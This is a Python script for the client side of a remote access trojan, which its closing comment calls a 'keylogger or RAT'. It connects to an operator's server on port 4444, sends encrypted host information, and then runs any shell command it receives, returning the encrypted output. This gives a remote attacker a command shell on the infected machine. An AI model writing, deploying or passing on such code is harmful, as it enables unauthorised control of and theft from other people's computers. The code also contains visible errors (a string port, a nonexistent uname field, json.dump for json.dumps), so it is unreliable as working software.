import socket
import subprocess
import os 
import json
from cryptography.fernet import Fernet

SERVER_IP = "your_server_ip"
# SERVER_IP = "192.168.1.100"  # Replace with your server IP

SERVER_PORT = "4444"
KEY_FILE = "key.key"

with open(KEY_FILE,"rb") as key_file:
    key = key_file.read()
fernet = Fernet(key)

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP,SERVER_PORT))
    return s 

def execute_command(command):
    return subprocess.check_output(command, shell=True)

def send_system_info(s):
    system_info = {
        "hostname" : os.uname()[1],
        "platform" : os.uname()[0],
        "release" : os.uname()[2],
        "version" : os.uname()[3],
        "machine" : os.uname()[4],
        "processor" : os.uname()[5],
    }

    encrypted_info = fernet.encrypt(json.dump(system_info).encode())
    s.send(encrypted_info)

def main():
     s = connect_to_server()
     send_system_info(s)
     while True: 
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        outout = execute_command(command)
        encrypted_output = fernet.encrypt(outout)
        s.send(encrypted_output)

if __name__ == "__main__":
    main()

''' Server IP Address: The server IP should point to a remote machine or a machine that is set up to receive the incoming data. This machine should be capable of securely receiving and processing the data from the keylogger or RAT. Examples of this could be:

A remote server that you control (for example, a cloud server).
A virtual machine (VM) that you own and have configured to handle the incoming data.
Any other machine on your network or remotely that is set up to receive, store, and process the data securely.
'''